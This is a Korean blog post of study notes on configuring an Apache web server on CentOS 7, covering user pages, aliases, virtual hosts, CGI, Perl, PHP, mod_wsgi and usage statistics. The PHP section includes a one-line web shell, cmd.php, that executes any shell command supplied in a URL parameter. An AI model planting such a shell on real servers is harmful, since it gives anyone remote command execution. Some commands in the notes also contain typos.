---
layout: post
title: "리눅스 네트워크 관리 - WEB 서버"
date: 2020-09-24 09:30:00 +0900
categories: dev
tags: linux  
image: >-
    https://blog.kakaocdn.net/dn/wmqiw/btqyeITbhmg/rtV9KH1o3bsq4KeJWOrcL0/img.jpg
---
WEB Server - httpd
<!--more-->

* toc
{:toc}

## 웹
## Apache Web Server on Cent OS 7.X 
* Program: httpd, mod_ssl + mod_perl(epel), php
* Daemon & Port & Protocol: httpd, 80(TCP), 443(TCP)
* Configuration File(s): /etc/httpd/conf/httpd.conf
* Sub Configuration File(s) 
    - /etc/httpd/conf.d/*.conf
    - /etc/httpd/conf.modules.d/*.conf
* Service: httpd.service

### 간단한 웹서버 구축
```console
# yum -y install httpd mod_ssl
# vi /etc/httpd/conf/httpd.conf
> ServerAdmin webmaster@linux2XX.example.com
> ServerName  www.linux2XX.example.com:80
# echo "Welcome To MyServer" > /var/www/html/index.html 
# systemctl enable httpd
# systemctl restart httpd
```

### 쉘 클라이언트 툴
* firefox<br>
    `# firefox http://www.example.com`
* curl/lynx CMD<br>
    `# curl -k http://www.example.com`<br>
    `# lynx http://www.example.com`
* telnet/ nc<br>
    `# telnel www.example.com 80` <br>
    `> GET /HTTP/1.0`

### 사용자 웹페이지 구성
* http://www.example.com<br>
    -> var/www/html/index.html
* http://www.example.com/~user01<br>
    -> /home/user01/public_html/index.html

```console
# su - user01
$ chmod 755 /home/user01
$ mkdir public_html
$ vi publiuc_html/index.html
$ exit

# vi /etc/httpd/conf.d/userdir.conf
# systemctl restart httpd
# firefox http://www.example.com/~user01 &
```         

### 웹 Alias 설정
* 웹 가상디렉토리
```console
# vi /etc/httpd/conf.d/autoindex.html
> Alias /user01/ "/home/user01/public_html/"
# systemctl restart httpd
# firefox http://www.linux2XX>example.com/user01/ &
```

* 웹 물리디렉토리
```console
# grep DocumentRoot /etc/httpd/conf/httpd.conf
# mkdir -p /var/www/html/user100
# echo hello world > /var/www/html/user100/index.html
# firefox http://www.linux222.example.com/user100/ &
```

### httpd
```console
# httpd -h
# httpd -t
# httpd -t -f httpd.example.conf
# httpd -v
# httpd -s
# httpd -M egrep 'userdir|ssl|cgi'
```

### 가상호스트 + CGI 설정
```console
# mkdir -p /www1
# vi /www1/index.html
# vi /etc/httpd/conf.d/vhost.conf
<VirtualHost *:80>  // <VirtualHost _default_:80>
    ServerAdmin root@linux222.example.com
    DocumentRoot /www1
    ServerName www.linux222.example.com
    <Directory /www1>
        Options Indexes Includes
	Require all granted
    </Directory>
    ScriptAlias /cgi-bin/ /www1/cgi-bin/
</VirtualHost>

# mkdir -p /www1/cgi-bin
# vi /www1/cgi-bin/test.cgi 
# systemctl restart httpd
```

### perl
```console
# yum install epel-release
# yum list "mod_perl"
# yum install mod_perl
# vi /etc/httpd/conf.d/perl.conf

# mkdir -p /var/www/perl
# vi /var/www/perl/test.pl
> #!/usr/bin/perl
> use strict;
> print "Content-Type: text/html; charset=ISO-8859-1\n\n";
> print "<HTML><BODY><H1><CENTER>";
> print "The current Perl time is:<BR>";
> print scalar localtime();
> print "</CENTER></H1></BODY></HTML>"
# chmod 555 /var/www/perl/test.pl
```

### epel disable
```console
# vi /etc/yum.repos.d/epel.repo
enabled=0
```

### php 스크립트 사용
```console
# yum -y install php
# systemctl restart httpd
# vi www1/test.php
> <?php phpinfo(); ?>
```

> One Line Web Shell

```console
# vi /www1/cmd.php
> <pre>
> <?php echo shell_exec($_GET['cmd']); ?>
> <pre>
```

### python + mod_wsgi
```console
# yum install mod_wsgi
# vi /etc/httpd/conf.d/wsgi.conf
-------------------------------------
WSGIScriptAlias /wsgi /www1/test_wsgi.py
-------------------------------------
# vi /www1/test_wsgi.py
```
```python
def application(environ, start_response):
	html = '<html><body><center><h1> Python Web Page </h1></center></body></html>'
	response_header = [('Content-Type', 'Text/html')]
	status = '200 OK'
	start_response(status, response_header)
	return [html]
```
```console
# chmod 555 /www1/test_wsgi.py
# systemctl restart httpd
# firefox http://www.linux2XX.example.com/wsgi &
```

### 가상호스트 설정
**전제조건 DNS 설정**
```
www1 IN A 172.16.6.1XX
www2 IN A 172.16.6.1XX
www3 IN A 172.16.6.1XX
```
**파일 생성 및 수정**
```console
# mkdir -p /www1 /www2 /www3
# cp /www1 index.html /www2/index.html
# cp /www1 index.html /www3/index.html

# vi /etc/httpd/conf.d/vhost.conf
```
```
<VirtualHost *:80>
    DocumentRoot /www3
    ServerName www3.linux222.example.com
    <Directory /www3>
	Require all granted
    </Directory>
</VirtualHost>
```

**웹 데몬 재기동**
```console
# systemctl restart httpd
```

> IP BASE Virtual Hosting

1. 아이피 추가 등록 NTC => 172.16.6.[122,172,72] ..
1. vi /etc/httpd/conf.d/vhost.conf
    ```
    <VirtualHost 172.16.6.122:80>
    <VirtualHost 172.16.6.172:80>
    <VirtualHost 172.16.6.72:80>
    ```
1. 서비스 재기동
```cosnole
# systemctl restart httpd
```

> 복원

```console
# nmcli connection modify ens33 ipv4.addresses 172.16.6.1XX/24
# nmcli connection up ens33

# vi /etc/httpd/conf.d/vhost.conf
:14,36s/^/#  => :14,36s/^#/
#systemctl restart httpd 
```

### http://www.example.com/server-info
```console
# cp /usr/share/doc/httpd-*/httpd-info.conf /etc/httpd/conf.d/server-info.conf
# vi server-info.conf
```
```console
<Location /server-info>
    SetHandler server-info
    Require host .example.com
    Require ip 172.16.6.122
</Location>
```

### 웹 통계/사용량
```console
# yum --enablerepo=epel install webalizer
# vi /etc/httpd/conf.d/webalizer.conf

# systemctl restart httpd
# webalizer

# firefox http://localhost/usage &
```

> Web Stress Tool

## 보안
WAF(Web Application Firewall): 웹 방화벽
* WebKnight
* ModSecurity for Apache

KR-CERT 서비스([www.krcert.or.kr/webprotect/samCompany.do](http://www.krcert.or.kr/webprotect/samCompany.do))
* 휘슬: 웹 서버에 설치하는 
* 캐슬: 웹 방화벽 S/W
